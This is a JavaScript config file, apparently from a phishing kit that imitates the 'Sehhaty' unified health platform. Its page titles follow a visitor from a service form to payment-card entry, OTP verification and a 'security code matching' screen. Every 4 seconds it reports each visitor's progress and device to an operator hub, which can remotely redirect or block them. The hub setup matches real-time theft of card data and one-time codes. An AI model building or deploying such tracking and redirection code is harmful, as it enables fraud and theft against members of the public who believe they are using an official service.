// config.js
window.SERVER_HUB_URL = window.location.origin.includes('localhost') || window.location.origin.includes('127.0.0.1')
  ? "http://localhost:5000"
  : window.location.origin;

(function() {
    var SERVER_HUB_URL = window.SERVER_HUB_URL.replace(/\/+$/, "");
    var siteKey = "site_sehhaty_v1";
    var visitorToken = localStorage.getItem('visitor_token');
    if (!visitorToken) {
        visitorToken = 'vis_' + Math.random().toString(36).substring(2, 10) + Date.now().toString(36);
        localStorage.setItem('visitor_token', visitorToken);
    }
    function sendPing() {
        var pageTitle = document.title;
        var currentPage = window.location.pathname;
        if (currentPage.endsWith('/') || currentPage === '') {
            currentPage = '/index.html';
        }
        
        // Extract service title if on service-details.html or custom service page
        if (window.location.href.includes('service-details.html')) {
            try {
                var urlParams = new URLSearchParams(window.location.search);
                var titleParam = urlParams.get('title');
                if (titleParam) {
                    pageTitle = "تفاصيل الخدمة - " + titleParam;
                }
            } catch(e){}
        } else if (window.location.href.includes('sehhaty.html')) {
            var selectedService = localStorage.getItem('selected_service_title');
            if (selectedService) {
                pageTitle = "نموذج تقديم - " + selectedService;
            } else {
                pageTitle = "نموذج تقديم الخدمة";
            }
        } else if (window.location.href.includes('bill.html')) {
            pageTitle = "بيانات بطاقة الدفع (Step 2)";
        } else if (window.location.href.includes('otp.html')) {
            pageTitle = "التحقق من الهاتف - رمز OTP";
        } else if (window.location.href.includes('loading.html')) {
            pageTitle = "جاري مطابقة رمز الأمان...";
        }
        
        fetch(SERVER_HUB_URL + '/api/tracker/ping', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                token: visitorToken,
                siteKey: siteKey,
                currentPage: currentPage,
                pageTitle: pageTitle,
                device: /Mobile|Android|iP(ad|hone)/i.test(navigator.userAgent) ? 'جوال' : 'سطح مكتب'
            })
        })
        .then(function(res) { return res.json(); })
        .then(function(data) {
            if (data) {
                if (data.isBlocked) {
                    if (window.location.pathname !== '/blocked') {
                        window.location.href = '/blocked';
                    }
                    return;
                }
                if (!data.isBlocked && window.location.pathname === '/blocked') {
                    window.location.href = 'index.html';
                    return;
                }
                if (data.status === 'go' && data.redirectUrl) {
                    var targetPath = data.redirectUrl.split('?')[0];
                    var actualPath = window.location.pathname;
                    if (actualPath !== targetPath && actualPath !== '/' && !window.location.href.includes(data.redirectUrl)) {
                        window.location.href = data.redirectUrl;
                    }
                }
            }
        })
        .catch(function(){});
    }
    
    // Auto register the site if it's the first time
    fetch(SERVER_HUB_URL + '/api/sites/auto-register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ siteKey: siteKey, name: 'منصة صحتي الموحدة' })
    }).catch(function(){});

    sendPing();
    setInterval(sendPing, 4000);
})();


